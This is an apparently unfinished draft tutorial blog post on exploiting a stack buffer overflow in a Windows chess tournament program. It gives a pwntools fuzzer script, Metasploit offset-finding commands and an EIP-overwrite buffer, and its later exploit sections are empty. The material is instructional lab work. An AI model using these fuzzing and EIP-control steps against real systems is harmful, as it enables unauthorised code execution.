---
title: 'Windows Binary Exploitation with Space Constraints'
date: 2025-01-28T17:48:35+01:00

footer: 'Jakob Friedl © 2025' 

categories: ['exploitation']
blog_post: true
draft: true
---

A buffer overflow is a flaw that allows an attacker to write more data to a buffer located on the stack than it can hold, which introduces security vulnerabilities due to the ability to overwrite adjacent memory addresses. In this post, I showcase the exploitation of a stack-based buffer overflow on Windows, where constraints of the target program required me to tweak my payload buffer to achieve code execution.<!--more-->

## Buffer Overflow Theory

TBD

## Exploitation

The program we are targeting in this example is used to manage chess tournaments. The main functionality includes the ability to create new chess players, to modify existing players and to create and delete chess tournaments. In order to keep this blog post concise, let's assume that we have identified that the feature to change the last name of an existing player is vulnerable to a buffer overflow attack. In the following sections we will look at how we can verify this vulnerability using a custom fuzzing-tool as well as how to build an exploit that triggers our malicious code.  

### Fuzzing

Fuzzing is a technique that utilizes automation to identify vulnerabilities by sending large, unexpected inputs to an application. As an example, the script below sends an increasingly long buffer consisting of 'A' characters to the change last name functionality of the application. In order to reach this point, the fuzzer first needs to go over the 'V1' and 'N' commands. The buffer is incremented by 10 characters every iteration in order to accurately identify the length that crashes the application. 

```python {lineNos=table}
#!/bin/python

from pwn import *

def main():
    # Connection
    target = b"192.168.168.142"
    port = 4444
    conn = remote(target,port)
    data = conn.recv()

    # Fuzzing-Configuration 
    fuzz = b"A"

    for i in range(0, 5000, 10): 
    
        # Sending request to change player data
        log.info(b"Sending: V1") 
        conn.send(b"V1\r\n")
        conn.recv()
        
        # Changing last name
        log.info(b"Sending: N") 
        conn.send(b"N\r\n") 
        conn.recvuntil(b"neuer Nachname:")

        log.info(f"Payload: %s * %d" % (fuzz, i)) 
        conn.send(fuzz * i + b"\r\n") 
        conn.recvuntil(b">")

        # Checking updated name 
        log.info(b"Sending: r")
        conn.send(b"r\r\n")
        conn.recvuntil(b">")
        log.info(b"Sending: L")
        conn.send(b"L\r\n")
        data = conn.recvline()
        log.info(b"Response: %s" % data)

if __name__ == "__main__":
    main()
```

On the Windows target system, the chess tournament application is started on port 4444 in x64dbg or any other debugger of choice. The screenshot below presents the final iterations of the fuzzer which shows that a buffer length of around 640 characters/bytes crashes the application. 

![Fuzzer crashing the application](/img/windows-bof/1.png)

We verify the vulnerability via the access violation exception that is triggered and shown in x64dbg. Looking closer, we can actually see that the instruction pointer (EIP) has been fully overwritten with the value *41414141*. Reader familiar with binary exploitation will recognize that sequence as the hexadecimal representation of *AAAA*. Being able to overwrite the EIP is the first step to a successful buffer overflow. 

![Access violation and EIP overwrite](/img/windows-bof/2.png)

### Identifying the offset

In the previous section we found that we are capable of overwriting the instruction pointer with our payload buffer. Since this register is used to direct the execution flow of the program, we need to figure out the exact offset at which the EIP is overwritten in order to make it eventually point to the malicious shellcode. To identify the offset, Metasploit's *pattern_create.rb* and *pattern_offset.rb* are used. Pattern_create.rb creates a cyclic pattern that allows us to identify the offset with the help of pattern_offset.rb.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 640 
```

![Cyclic Pattern generated](/img/windows-bof/3.png)

When this pattern is sent to the application instead of the 'A'-buffer, the value of the EIP at the crash is *32764131*, which was discovered as previously with the debugger. Passing this into the pattern_offset.rb tool, the offset of the EIP is calculated to be at 635 bytes.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 640 -q 32764131
```

![Offset calculated](/img/windows-bof/4.png)

To showcase that this offset actually enables us to control the value of the EIP, we create a simple payload buffer that replaces the EIP address with *BBBB* or *42424242* in hex and send it to the application. With the EIP controlled, the next step is to identify all possible bad characters that could prevent our exploit from working as expected. 

```python {lineNos=table}
offset = 635  # (EIP)
buffer = b"A" * offset + b"B" * 4 + b"D" * (640-offset-4)     
```

![Controlled EIP overwrite](/img/windows-bof/5.png)

### Identifying bad characters



### Where do we jump to?

### Popping calc.exe!

## Conclusion